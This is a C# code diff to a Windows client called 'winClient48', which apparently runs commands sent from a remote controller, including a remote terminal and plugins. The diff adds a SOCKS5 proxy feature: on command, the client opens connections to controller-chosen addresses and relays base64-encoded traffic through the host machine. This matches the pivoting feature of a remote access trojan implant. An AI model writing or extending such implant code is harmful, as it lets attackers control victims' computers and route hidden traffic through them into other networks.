@@ -37,8 +37,9 @@ namespace winClient48
     public partial class Form1 : Form
     {
         private string[] m_args;
-        clsfnXterm m_fnXterm;
-        clsfnPluginMgr m_pluginMgr;
+        private clsfnXterm m_fnXterm;
+        private clsfnPluginMgr m_pluginMgr;
+        private Dictionary<int, clsSocks5> m_dicSocks5 = new Dictionary<int, clsSocks5>();
 
         public Form1(string[] args)
         {
@@ -2771,6 +2772,7 @@ namespace winClient48
                 }
 
                 #endregion
+                #region Xterm
 
                 else if (cmd[0] == "xterm")
                 {
@@ -2824,10 +2826,64 @@ namespace winClient48
 
                     }
                 }
+
+                #endregion
+                #region Proxy
+
+                else if (cmd[0] == "proxy")
+                {
+                    if (cmd[1] == "socks5")
+                    {
+                        if (cmd[2] == "open")
+                        {
+                            _ = Task.Run(() =>
+                            {
+                                int nStreamId = int.Parse(cmd[3]);
+                                string szIPv4 = cmd[4];
+                                int nPort = int.Parse(cmd[5]);
+
+                                clsSocks5 socks5 = new clsSocks5(v, nStreamId, szIPv4, nPort);
+                                m_dicSocks5.Add(nStreamId, socks5);
+
+                                bool bResult = socks5.fnOpen();
+                                v.fnSendCommand(new string[]
+                                {
+                                    "proxy",
+                                    "socks5",
+                                    "open",
+                                    bResult ? "1" : "0",
+                                    nStreamId.ToString(),
+                                });
+                            });
+                        }
+                        else if (cmd[2] == "data")
+                        {
+                            int nStreamId = int.Parse(cmd[3]);
+                            string szB64 = cmd[4];
+
+                            if (m_dicSocks5.TryGetValue(nStreamId, out var socks5))
+                            {
+                                byte[] abData = Convert.FromBase64String(szB64);
+                                socks5.fnForwarding(abData);
+                            }
+                        }
+                        else if (cmd[2] == "close")
+                        {
+                            int nStreamId = int.Parse(cmd[3]);
+                            if (m_dicSocks5.TryGetValue(nStreamId, out var socks5))
+                            {
+                                m_dicSocks5.Remove(nStreamId);
+                                socks5.Dispose();
+                            }
+                        }
+                    }
+                }
+
+                #endregion
             }
             catch (Exception ex)
             {
-                //MessageBox.Show(ex.Message, "winClient48");
+                MessageBox.Show(ex.Message, "winClient48");
                 v.SendCommand($"error|{clsCrypto.b64E2Str(ex.Message)}");
             }
         }
@@ -3108,7 +3164,7 @@ namespace winClient48
                     }
                     catch
                     {
-
+                        return;
                     }
                 }
 
